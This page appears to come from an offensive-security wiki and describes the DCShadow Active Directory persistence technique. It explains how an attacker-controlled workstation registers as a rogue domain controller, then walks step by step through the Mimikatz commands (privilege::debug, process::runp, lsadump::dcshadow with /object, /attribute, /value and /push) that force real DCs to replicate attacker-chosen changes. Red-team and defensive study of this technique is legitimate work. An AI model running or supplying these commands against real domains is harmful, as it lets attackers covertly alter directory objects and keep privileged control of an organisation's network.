## Theory
The idea behind this persistence technique is to have an attacker-controlled machine act as a domain controller (shadow DC) to push changes onto the domain by forcing other domain controllers to replicate.

There are two requirements for a machine to act as a domain controller:

1. Be registered as a DC in the domain**: this is done by:

    - modifying the computer's SPN (`ServicePrincipalName`) to `GC/$HOSTNAME.$DOMAIN/$DOMAIN`
    - adding an entry like `CN=$HOSTNAME,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=$DOMAIN` with the following attribute values: 
        - `objectClass: server`
        - `dNSHostName: $HOSTNAME.$DOMAIN`
        - `serverReference: CN=$HOSTNAME,CN=Computers,DC=$DOMAIN`

2. Be able to request and/or respond to specific RPC calls: `DRSBind, DRSUnbind, DRSCrackNames, DRSAddEntry, DRSReplicaAdd, DRSReplicaDel, DRSGetNCChanges`.
## Exploit
1. Register the workstation that will act as the shadow DC
    - add the required entry in CN=Configuration
    - modify the workstation's SPN

    **Example**:

    - add entry
    ```bash
    entry: CN=Win10, CN=servers, CN=Default-First-Site-Name, CN=sites, CN=Configuration, DC=test, DC=local
    ```
    - Change SPN
    ```bash
    AttributeValue: GC/Win10.test.local/test.local
    ```

2. Prepare the changes to be pushed onto the domain (with calls to `DRSAddEntry`)

3. Push the changes by forcing another legitimate DC to replicate from the workstation with a `DRSReplicaAdd` call, which automatically makes a `DRSGetNCChanges` call from the legitimate DC to the shadow DC.

4. Unregister the workstation so it is not longer considered to be a DC (by a `DRSReplicaDel` call and by reverting changes made to `CN=Configuration` and the workstation's SPN).
=== "Windows"
    DC Shadow can be performed by using Mimikatz. It works in every 64-bits Windows Server version up to 2022 (included). Everything happens on the workstation that will act as the shadow DC.

    Two Mimikatz shells are required:

        - one with domain admin privileges (called the trigger shell from now on)
        - one as NT-AUTHORITY\SYSTEM (called the RPC shell from now on)

    **Preparing shells**
    ```bash
    # In a mimikatz shell, launched with DA rights
    # This will be the trigger shell
    privilege::debug

    # The following command will open a new mimikatz shell as NT-AUTHORITY\SYSTEM
    # This will be the RPC shell
    process::runp

    # On both shell, run the following command to confirm permissions
    # On the trigger shell, it will return the domain admin account name (used to lauch the first mimikatz shell)
    # On the RPC shell, it will return NT-AUTHORITY\SYSTEM
    token::whoami
    ```

    **Preparing changes to push**
    ```bash
    # (RPC shell)
    lsadump::dcshadow /object:ObjectToModify /attribute:AttributeToModifyOnTargetedObject /value:NewValueOfTargetedAttribute
    ```

    **Pushing changes**
    ```bash
    # (Trigger shell)
    # The command below will register the shadow DC, push the changes, and unregister
    lsadump::dcshadow /push
    ```